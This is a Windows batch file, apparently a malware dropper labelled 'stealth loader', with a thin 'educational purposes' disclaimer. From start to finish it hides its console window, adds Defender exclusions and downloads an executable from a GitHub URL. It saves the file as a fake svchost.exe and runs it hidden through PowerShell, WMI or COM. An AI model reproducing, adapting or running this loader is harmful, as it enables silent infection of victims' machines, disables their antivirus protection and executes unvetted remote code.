@echo off
setlocal enabledelayedexpansion

:: ============================================================
::   STEALTH LOADER - WORKING VERSION
::   For Educational Purposes Only - Use in Isolated VM
:: ============================================================

:: ============================================================
::  STEP 1: PREVENT RE-EXECUTION (Flag File)
:: ============================================================

set "FLAG_FILE=%TEMP%\svchost_executed.flag"
if exist "%FLAG_FILE%" exit /b 0

:: ============================================================
::  STEP 2: HIDE CONSOLE (Simple PowerShell method)
:: ============================================================

powershell -WindowStyle Hidden -Command "exit" >nul 2>&1

:: Alternative hide method (if the above fails)
powershell -Command "$win = Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);[DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow();' -Name win -PassThru; $win::ShowWindow($win::GetConsoleWindow(), 0)" >nul 2>&1

:: ============================================================
::  STEP 3: 18-SECOND DELAY
:: ============================================================

timeout /t 18 /nobreak >nul

:: ============================================================
::  STEP 4: SET VARIABLES
:: ============================================================

set "URL=https://github.com/e34821704-max/usdtrsv/raw/refs/heads/main/Skype_Business.exe"
set "PAYLOAD=%TEMP%\svchost.exe"

:: ============================================================
::  STEP 5: DEFENDER EXCLUSION
:: ============================================================

powershell -Command "Add-MpPreference -ExclusionPath '%PAYLOAD%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%PAYLOAD%'" >nul 2>&1

:: ============================================================
::  STEP 6: DOWNLOAD (Simple PowerShell)
:: ============================================================

:: Delete old file if exists
if exist "%PAYLOAD%" del "%PAYLOAD%" >nul 2>&1

:: Download using PowerShell
powershell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('%URL%', '%PAYLOAD%')" >nul 2>&1

:: If PowerShell fails, use certutil
if not exist "%PAYLOAD%" (
    certutil -urlcache -split -f "%URL%" "%PAYLOAD%" >nul 2>&1
)

:: ============================================================
::  STEP 7: VERIFY FILE EXISTS
:: ============================================================

if not exist "%PAYLOAD%" (
    exit /b 1
)

:: ============================================================
::  STEP 8: CREATE FLAG FILE (Prevents re-execution)
:: ============================================================

echo Executed at %date% %time% > "%FLAG_FILE%"

:: ============================================================
::  STEP 9: 3 EXECUTION METHODS (Sequential - Stops on success)
:: ============================================================

:: Method 1: Start-Process (Most reliable)
powershell -Command "Start-Process -FilePath '%PAYLOAD%' -WindowStyle Hidden" >nul 2>&1
timeout /t 2 /nobreak >nul

:: Check if running - if yes, skip to cleanup
tasklist /fi "imagename eq svchost.exe" 2>nul | findstr "svchost.exe" >nul
if errorlevel 0 goto :cleanup

:: Method 2: WMI Execution (if Method 1 fails)
wmic process call create "%PAYLOAD%" >nul 2>&1
timeout /t 2 /nobreak >nul

:: Check if running
tasklist /fi "imagename eq svchost.exe" 2>nul | findstr "svchost.exe" >nul
if errorlevel 0 goto :cleanup

:: Method 3: COM Object (if Methods 1 & 2 fail)
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.Run('%PAYLOAD%', 0, $false)" >nul 2>&1

:: ============================================================
::  STEP 10: CLEANUP
:: ============================================================

:cleanup

:: Delete any lingering scheduled tasks
schtasks /delete /tn "WindowsUpdateSvc" /f >nul 2>&1
schtasks /delete /tn "WindowsUpdate" /f >nul 2>&1

:: ============================================================
::  DONE - EXIT CLEANLY
:: ============================================================

exit /b 0